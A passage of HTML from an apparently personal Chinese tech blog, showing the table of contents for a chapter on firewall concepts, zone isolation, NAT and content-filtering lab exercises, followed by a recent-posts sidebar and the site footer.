href="#17-1%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">8.14.5.1.</span> <span class="toc-text">17.1防火墙的基本概念</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%EF%BC%89%E9%9A%94%E7%A6%BB%E7%BD%91%E7%BB%9C%EF%BC%9A"><span class="toc-number">8.14.5.1.1.</span> <span class="toc-text">1）隔离网络：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#17-2%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD"><span class="toc-number">8.14.5.2.</span> <span class="toc-text">17.2防火墙的基本功能</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#17-3%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A7%E5%93%81%E5%8F%8A%E5%8E%82%E5%AE%B6"><span class="toc-number">8.14.5.3.</span> <span class="toc-text">17.3防火墙产品及厂家</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#17-4%E5%8C%BA%E5%9F%9F%E9%9A%94%E7%A6%BB"><span class="toc-number">8.14.5.4.</span> <span class="toc-text">17.4区域隔离</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%EF%BC%89%E9%98%B2%E7%81%AB%E5%A2%99%E5%8C%BA%E5%9F%9F%E6%A6%82%E5%BF%B5"><span class="toc-number">8.14.5.4.1.</span> <span class="toc-text">1）防火墙区域概念</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#17-5%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E5%88%86%E7%B1%BB"><span class="toc-number">8.14.5.5.</span> <span class="toc-text">17.5防火墙的分类</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%EF%BC%89%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2"><span class="toc-number">8.14.5.5.1.</span> <span class="toc-text">1）防火墙的发展史</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2%EF%BC%89%E8%A1%A1%E9%87%8F%E9%98%B2%E7%81%AB%E5%A2%99%E6%80%A7%E8%83%BD%E7%9A%84%E4%BA%94%E5%A4%A7%E6%8C%87%E6%A0%87%EF%BC%9A"><span class="toc-number">8.14.5.5.2.</span> <span class="toc-text">2）衡量防火墙性能的五大指标：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3%EF%BC%89%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E5%85%B8%E5%9E%8B%E5%BA%94%E7%94%A8"><span class="toc-number">8.14.5.5.3.</span> <span class="toc-text">3）防火墙的典型应用</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#17-6%E9%85%8D%E7%BD%AE%E3%80%81%E5%AE%9E%E9%AA%8C"><span class="toc-number">8.14.5.6.</span> <span class="toc-text">17.6配置、实验</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E9%AA%8C%E8%AF%81%E5%8C%BA%E5%9F%9F%E9%9A%94%E7%A6%BB%E5%8F%8A%E7%AD%96%E7%95%A5%E7%BC%96%E5%86%99"><span class="toc-number">8.14.5.6.1.</span> <span class="toc-text">实验一：验证区域隔离及策略编写</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%BA%8C%EF%BC%9A%E5%81%9A%E6%BA%90%E8%BD%AC%E6%8D%A2%EF%BC%9ASNAT"><span class="toc-number">8.14.5.6.2.</span> <span class="toc-text">实验二：做源转换：SNAT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E5%81%9A%E7%9B%AE%E6%A0%87%E8%BD%AC%E6%8D%A2%EF%BC%9ADNAT"><span class="toc-number">8.14.5.6.3.</span> <span class="toc-text">实验三：做目标转换：DNAT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E5%9B%9B%EF%BC%9A%E5%BA%94%E7%94%A8%E5%B1%82%E8%BF%87%E6%BB%A4%EF%BC%88%E5%86%85%E5%AE%B9%E8%BF%87%E6%BB%A4%EF%BC%89"><span class="toc-number">8.14.5.6.4.</span> <span class="toc-text">实验四：应用层过滤（内容过滤）</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/12/%E4%B8%AA%E4%BA%BA%E9%A1%B9%E7%9B%AE-xin-valv/" title="Untitled">Untitled</a><time datetime="2025-06-12T15:01:17.015Z" title="Created 2025-06-12 23:01:17">2025-06-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/25/%E6%96%B0%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91%E6%B5%81%E7%A8%8B%EF%BC%88Vue3+SpringBoot2%EF%BC%89/" title="新项目开发流程">新项目开发流程</a><time datetime="2025-05-25T14:55:07.556Z" title="Created 2025-05-25 22:55:07">2025-05-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/11/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91-%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AE/" title="科学上网-各种协议">科学上网-各种协议</a><time datetime="2025-01-11T08:09:03.000Z" title="Created 2025-01-11 16:09:03">2025-01-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/03/%E4%B8%AA%E4%BA%BA%E7%AE%80%E4%BB%8B/" title="个人简介">个人简介</a><time datetime="2025-01-03T13:31:52.000Z" title="Created 2025-01-03 21:31:52">2025-01-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/03/%E5%85%B6%E5%AE%83/" title="其它">其它</a><time datetime="2025-01-03T01:58:56.000Z" title="Created 2025-01-03 09:58:56">2025-01-03</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By xin</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.1"></script><script src="/js/main.js?v=5.5.1"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>